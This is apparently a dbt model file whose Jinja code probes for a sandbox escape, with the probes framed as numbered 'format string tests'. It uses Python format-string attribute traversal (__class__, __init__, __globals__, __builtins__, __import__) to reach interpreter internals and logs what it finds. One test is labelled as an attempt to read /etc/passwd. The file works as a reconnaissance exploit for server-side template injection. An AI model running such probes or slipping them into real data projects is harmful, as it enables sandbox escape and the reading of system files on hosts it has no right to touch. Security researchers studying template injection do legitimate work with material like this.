{# Format string tests - check if angle brackets are being stripped #}

{# Test 1: format_map with __class__.__name__ (no angle brackets) #}
{%- set r1 = "{x.__class__.__name__}".format_map({'x': ''}) -%}
{{ log("FMAP_CLASS_NAME=" ~ r1, info=True) }}

{# Test 2: Basic format to confirm format works at all #}
{%- set r2 = "{0}_{1}".format("hello", "world") -%}
{{ log("FORMAT_BASIC=" ~ r2, info=True) }}

{# Test 3: format with object attribute access #}
{%- set r3 = "{0.__class__.__name__}".format("test") -%}
{{ log("FORMAT_CLASS_NAME=" ~ r3, info=True) }}

{# Test 4: format with deeper access #}
{%- set r4 = "{0.__class__.__init__}".format("test") -%}
{{ log("FORMAT_INIT=" ~ r4, info=True) }}

{# Test 5: format with __globals__ access #}
{%- set r5 = "{0.__class__.__init__.__globals__}".format("test") -%}
{{ log("FORMAT_GLOBALS_LEN=" ~ r5 | length, info=True) }}
{{ log("FORMAT_GLOBALS_PREVIEW=" ~ r5 | truncate(500), info=True) }}

{# Test 6: If globals works, try __builtins__ #}
{%- if r5 | length > 10 -%}
  {# Parse the globals dict for __builtins__ #}
  {{ log("FORMAT_GLOBALS_HAS_BUILTINS=checking", info=True) }}
  {%- set r6 = "{0.__class__.__init__.__globals__[__builtins__][__import__]}".format("test") -%}
  {{ log("FORMAT_IMPORT=" ~ r6, info=True) }}
{%- endif -%}

{# Test 7: Alternative via lipsum #}
{%- set r7 = "{0.__class__.__name__}".format(lipsum) -%}
{{ log("LIPSUM_CLASS_NAME=" ~ r7, info=True) }}

{# Test 8: Try with cycler object #}
{%- set c = cycler(1,2,3) -%}
{%- set r8 = "{0.__class__.__name__}".format(c) -%}
{{ log("CYCLER_INST_CLASS=" ~ r8, info=True) }}

{# Test 9: Try dict subclass access #}
{%- set r9 = "{0.__class__.__bases__}".format({}) -%}
{{ log("DICT_BASES=" ~ r9 | truncate(200), info=True) }}

{# Test 10: Try to read /etc/passwd via format + open #}
{%- set r10 = "{0.__class__.__init__.__globals__[__builtins__]}".format("") -%}
{{ log("STR_BUILTINS_LEN=" ~ r10 | length, info=True) }}
{%- if r10 | length > 100 -%}
  {{ log("STR_BUILTINS_PREVIEW=" ~ r10 | truncate(500), info=True) }}
{%- endif -%}

SELECT 1 as id
